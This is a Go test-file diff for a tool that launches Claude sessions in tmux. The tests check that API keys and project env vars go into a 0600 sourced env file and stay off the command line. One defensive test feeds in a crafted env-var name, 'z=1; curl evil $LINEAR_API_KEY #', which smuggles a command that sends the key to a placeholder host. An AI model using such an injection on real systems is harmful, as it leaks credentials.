@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"reflect"
 	"strings"
@@ -180,13 +181,122 @@ func TestSpawnHappyPathFullSequence(t *testing.T) {
 	}
 
 	// tmux: one new-session, detached, named id, cwd = worktree, running a
-	// single shell command that exports LOLA_SESSION and starts claude with
-	// the generated settings and the short read-the-prompt argv.
+	// single shell command that sources the 0600 .lola/env (which exports
+	// LOLA_SESSION and any secret) and execs claude with the generated settings
+	// and the short read-the-prompt argv. Nothing secret is on argv.
 	wantTmux := "new-session -d -s " + id + " -c " + dir +
-		" env LOLA_SESSION=" + id + " /usr/local/bin/claude --settings .lola/settings.json" +
-		" 'You are lola session " + id + ". Read .lola/prompt.md in the current directory first; it contains your task briefing.'"
+		" exec sh -c 'set -a; . ./.lola/env; set +a; exec /usr/local/bin/claude --settings .lola/settings.json" +
+		` '\''You are lola session ` + id + `. Read .lola/prompt.md in the current directory first; it contains your task briefing.'\'''`
 	if gotTmux := loggedArgs(t, f.tmuxLog); gotTmux != wantTmux {
 		t.Errorf("tmux calls:\n%s\nwant:\n%s", gotTmux, wantTmux)
+	}
+
+	// .lola/env is 0600 and carries LOLA_SESSION (no LinearKey provider on this
+	// fixture, so no LINEAR_API_KEY line).
+	assertMode(t, filepath.Join(dir, ".lola", "env"), 0o600)
+	env := readFile(t, filepath.Join(dir, ".lola", "env"))
+	if !strings.Contains(env, "LOLA_SESSION="+id+"\n") {
+		t.Errorf(".lola/env missing LOLA_SESSION:\n%s", env)
+	}
+	if strings.Contains(env, "LINEAR_API_KEY") {
+		t.Errorf(".lola/env must have no key line without a provider:\n%s", env)
+	}
+}
+
+// assertMode fails unless path exists with exactly the given permission bits.
+func assertMode(t *testing.T, path string, want os.FileMode) {
+	t.Helper()
+	fi, err := os.Stat(path)
+	if err != nil {
+		t.Fatalf("stat %s: %v", path, err)
+	}
+	if fi.Mode().Perm() != want {
+		t.Errorf("%s mode = %o, want %o", path, fi.Mode().Perm(), want)
+	}
+}
+
+// readFile reads path or fails the test.
+func readFile(t *testing.T, path string) string {
+	t.Helper()
+	b, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatalf("read %s: %v", path, err)
+	}
+	return string(b)
+}
+
+// TestSpawnForwardsLinearKeyViaEnvFileNotArgv is the secret-safety guarantee:
+// the resolved Linear key lands in the 0600 .lola/env file and NEVER in the
+// tmux new-session argv — neither the key value nor the string "LINEAR_API_KEY".
+func TestSpawnForwardsLinearKeyViaEnvFileNotArgv(t *testing.T) {
+	f := newFixture(t, "", "")
+	const secret = "lin_api_sup3r-s3cret/value"
+	f.n.LinearKey = func() string { return secret }
+
+	if _, err := f.n.Spawn(context.Background(), f.p, issueENG42()); err != nil {
+		t.Fatalf("Spawn: %v", err)
+	}
+	dir := filepath.Join(f.root, "nori", "lola-nori-eng-42")
+
+	assertMode(t, filepath.Join(dir, ".lola", "env"), 0o600)
+	env := readFile(t, filepath.Join(dir, ".lola", "env"))
+	if !strings.Contains(env, "LINEAR_API_KEY="+secret+"\n") {
+		t.Errorf(".lola/env must carry the key:\n%s", env)
+	}
+	if !strings.Contains(env, "LOLA_SESSION=lola-nori-eng-42\n") {
+		t.Errorf(".lola/env must carry LOLA_SESSION:\n%s", env)
+	}
+
+	// The tmux launch argv must leak neither the key nor the var name.
+	tmuxCalls := loggedArgs(t, f.tmuxLog)
+	if strings.Contains(tmuxCalls, secret) {
+		t.Errorf("SECRET LEAK: key value appears in tmux argv:\n%s", tmuxCalls)
+	}
+	if strings.Contains(tmuxCalls, "LINEAR_API_KEY") {
+		t.Errorf("tmux argv must not name LINEAR_API_KEY:\n%s", tmuxCalls)
+	}
+	if !strings.Contains(tmuxCalls, "set -a; . ./.lola/env; set +a; exec /usr/local/bin/claude") {
+		t.Errorf("launch must source ./.lola/env and exec claude:\n%s", tmuxCalls)
+	}
+}
+
+// TestSpawnNoLinearKeyOmitsKeyLine: an empty provider (or none) yields no
+// LINEAR_API_KEY line, and the session still launches.
+func TestSpawnNoLinearKeyOmitsKeyLine(t *testing.T) {
+	f := newFixture(t, "", "")
+	f.n.LinearKey = func() string { return "" } // resolvable but unavailable
+
+	if _, err := f.n.Spawn(context.Background(), f.p, issueENG42()); err != nil {
+		t.Fatalf("Spawn: %v", err)
+	}
+	dir := filepath.Join(f.root, "nori", "lola-nori-eng-42")
+	env := readFile(t, filepath.Join(dir, ".lola", "env"))
+	if strings.Contains(env, "LINEAR_API_KEY") {
+		t.Errorf(".lola/env must omit the key line when the provider returns empty:\n%s", env)
+	}
+	if !strings.Contains(loggedArgs(t, f.tmuxLog), "new-session -d -s lola-nori-eng-42") {
+		t.Errorf("session must still launch without a key:\n%s", loggedArgs(t, f.tmuxLog))
+	}
+}
+
+// TestSpawnProjectEnvLandsInEnvFileNotArgv: [[project]].env pairs are written
+// (0600, sorted) to .lola/env, not the tmux argv.
+func TestSpawnProjectEnvLandsInEnvFileNotArgv(t *testing.T) {
+	f := newFixture(t, "", "")
+	f.p.Env = map[string]string{"APP_ENV": "local dev", "B_VAR": "plain"}
+
+	if _, err := f.n.Spawn(context.Background(), f.p, issueENG42()); err != nil {
+		t.Fatalf("Spawn: %v", err)
+	}
+	dir := filepath.Join(f.root, "nori", "lola-nori-eng-42")
+	assertMode(t, filepath.Join(dir, ".lola", "env"), 0o600)
+	env := readFile(t, filepath.Join(dir, ".lola", "env"))
+	if !strings.Contains(env, "APP_ENV='local dev'\n") || !strings.Contains(env, "B_VAR=plain\n") {
+		t.Errorf(".lola/env must carry project env pairs:\n%s", env)
+	}
+	tmuxCalls := loggedArgs(t, f.tmuxLog)
+	if strings.Contains(tmuxCalls, "APP_ENV") || strings.Contains(tmuxCalls, "B_VAR") {
+		t.Errorf("project env must not appear on tmux argv:\n%s", tmuxCalls)
 	}
 }
 
@@ -635,33 +745,134 @@ func TestExcludeLolaDirResolvesWorktreePointer(t *testing.T) {
 
 func TestLaunchCommandQuoting(t *testing.T) {
 	n := &Native{} // ClaudeBin empty -> "claude" from PATH
-	got := n.launchCommand(config.Project{}, "lola-nori-eng-42")
-	want := "env LOLA_SESSION=lola-nori-eng-42 claude --settings .lola/settings.json " +
-		"'You are lola session lola-nori-eng-42. Read .lola/prompt.md in the current directory first; it contains your task briefing.'"
+	got := n.launchCommand("lola-nori-eng-42")
+	// The POSIX line is wrapped in `sh -c '...'` so the user's login shell
+	// (which may be fish/csh/tcsh, not a POSIX sh) only has to exec `sh`; the
+	// inner single quotes around the prompt are escaped as '\''.
+	want := "exec sh -c 'set -a; . ./.lola/env; set +a; exec claude --settings .lola/settings.json " +
+		`'\''You are lola session lola-nori-eng-42. Read .lola/prompt.md in the current directory first; it contains your task briefing.'\''` +
+		"'"
 	if got != want {
 		t.Errorf("launchCommand:\n%s\nwant:\n%s", got, want)
 	}
+	// The wrapper must delegate to sh, not run the POSIX builtins directly in
+	// the login shell (fish/csh/tcsh have no `set -a`/`.`).
+	if !strings.HasPrefix(got, "exec sh -c ") {
+		t.Errorf("launchCommand must wrap the POSIX line in `sh -c`:\n%s", got)
+	}
 
 	n.ClaudeBin = "/odd path/claude's bin"
-	got = n.launchCommand(config.Project{}, "lola-nori-eng-42")
-	if !strings.Contains(got, `'/odd path/claude'\''s bin'`) {
-		t.Errorf("launchCommand must single-quote unsafe binary paths:\n%s", got)
+	got = n.launchCommand("lola-nori-eng-42")
+	if !strings.Contains(got, `/odd path/claude`) {
+		t.Errorf("launchCommand must include the binary path:\n%s", got)
+	}
+	// The launch line never carries env inline; it only sources the file.
+	if strings.Contains(got, "LOLA_SESSION") || strings.Contains(got, "env ") {
+		t.Errorf("launchCommand must not put env on argv:\n%s", got)
 	}
 }
 
-func TestLaunchCommandForwardsProjectEnv(t *testing.T) {
+// TestLaunchCommandRunsUnderNonPosixLoginShells guards the fish/csh/tcsh
+// regression: the launch line is executed by the user's $SHELL -c, so wrapping
+// the POSIX-only body in `sh -c` must let a csh/tcsh login shell still source
+// the env file and reach the exec. Runs against whichever shells exist on the
+// box (always /bin/sh; csh/tcsh ship with macOS).
+func TestLaunchCommandRunsUnderNonPosixLoginShells(t *testing.T) {
+	dir := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(dir, lolaDir), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	// A sourceable env file with a value that needs quoting.
+	env := "LOLA_SESSION=lola-x-eng-1\nLINEAR_API_KEY='sec ret'\n"
+	if err := os.WriteFile(filepath.Join(dir, lolaDir, "env"), []byte(env), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	// Fake "claude" that proves the env was sourced before exec.
+	bin := filepath.Join(dir, "bin")
+	if err := os.MkdirAll(bin, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	claude := filepath.Join(bin, "claude")
+	script := "#!/bin/sh\nprintf 'OK key=[%s] session=[%s]\\n' \"$LINEAR_API_KEY\" \"$LOLA_SESSION\"\n"
+	if err := os.WriteFile(claude, []byte(script), 0o755); err != nil {
+		t.Fatal(err)
+	}
+
 	n := &Native{}
+	line := n.launchCommand("lola-x-eng-1")
+
+	for _, shell := range []string{"/bin/sh", "/bin/bash", "/bin/zsh", "/bin/csh", "/bin/tcsh"} {
+		if _, err := os.Stat(shell); err != nil {
+			continue // shell not installed on this box
+		}
+		t.Run(filepath.Base(shell), func(t *testing.T) {
+			cmd := exec.Command(shell, "-c", line)
+			cmd.Dir = dir
+			cmd.Env = append(os.Environ(), "PATH="+bin+string(os.PathListSeparator)+os.Getenv("PATH"))
+			out, err := cmd.CombinedOutput()
+			if err != nil {
+				t.Fatalf("%s -c launchCommand failed: %v\noutput: %s", shell, err, out)
+			}
+			got := string(out)
+			if !strings.Contains(got, "OK key=[sec ret]") {
+				t.Errorf("%s: env not sourced before exec; output: %s", shell, got)
+			}
+			if !strings.Contains(got, "session=[lola-x-eng-1]") {
+				t.Errorf("%s: LOLA_SESSION not exported; output: %s", shell, got)
+			}
+		})
+	}
+}
+
+func TestEnvFileForwardsSessionKeyAndProjectEnv(t *testing.T) {
+	n := &Native{LinearKey: func() string { return "lin secret" }} // space forces quoting
 	p := config.Project{Env: map[string]string{
 		"B_VAR":   "plain",
 		"APP_ENV": "local dev", // needs quoting
 	}}
-	got := n.launchCommand(p, "lola-nori-eng-42")
-	// Sorted key order, each assignment quoted as a whole when needed, after
-	// LOLA_SESSION and before the claude invocation.
-	want := "env LOLA_SESSION=lola-nori-eng-42 'APP_ENV=local dev' B_VAR=plain claude --settings .lola/settings.json " +
-		"'You are lola session lola-nori-eng-42. Read .lola/prompt.md in the current directory first; it contains your task briefing.'"
-	if got != want {
-		t.Errorf("launchCommand:\n%s\nwant:\n%s", got, want)
+	// Sorted key order, each value single-quoted when needed; LOLA_SESSION
+	// first, the key second, project env last.
+	want := "LOLA_SESSION=lola-nori-eng-42\n" +
+		"LINEAR_API_KEY='lin secret'\n" +
+		"APP_ENV='local dev'\n" +
+		"B_VAR=plain\n"
+	if got := string(n.envFile(p, "lola-nori-eng-42")); got != want {
+		t.Errorf("envFile:\n%q\nwant:\n%q", got, want)
+	}
+
+	// nil provider: no key line at all.
+	n2 := &Native{}
+	if got := string(n2.envFile(config.Project{}, "id")); got != "LOLA_SESSION=id\n" {
+		t.Errorf("envFile without provider = %q, want only LOLA_SESSION", got)
+	}
+}
+
+// TestEnvFileSkipsNonIdentifierNames is the defense-in-depth guard for the
+// key-exfiltration path: config.Validate already rejects env names that are not
+// shell identifiers, but even if that gate were bypassed, envFile must never
+// emit a NAME that the launch line would shell-parse (the NAME is the left side
+// of a sourced assignment, evaluated with LINEAR_API_KEY already exported).
+func TestEnvFileSkipsNonIdentifierNames(t *testing.T) {
+	n := &Native{LinearKey: func() string { return "topsecret" }}
+	p := config.Project{Env: map[string]string{
+		"GOOD":                             "ok",
+		"z=1; curl evil $LINEAR_API_KEY #": "x", // crafted injection name
+		"has-dash":                         "y", // not an identifier
+	}}
+	got := string(n.envFile(p, "lola-x-eng-1"))
+	if !strings.Contains(got, "GOOD=ok\n") {
+		t.Errorf("envFile dropped a valid identifier:\n%s", got)
+	}
+	if strings.Contains(got, "curl") || strings.Contains(got, "has-dash") {
+		t.Errorf("envFile must skip non-identifier names (key-leak vector):\n%s", got)
+	}
+	// The whole file must be sourceable with no command substitution / extra
+	// commands: every non-comment line is NAME='...' with an identifier NAME.
+	for _, line := range strings.Split(strings.TrimSpace(got), "\n") {
+		name, _, ok := strings.Cut(line, "=")
+		if !ok || !envNameRe.MatchString(name) {
+			t.Errorf("envFile emitted a non-identifier assignment line: %q", line)
+		}
 	}
 }
 
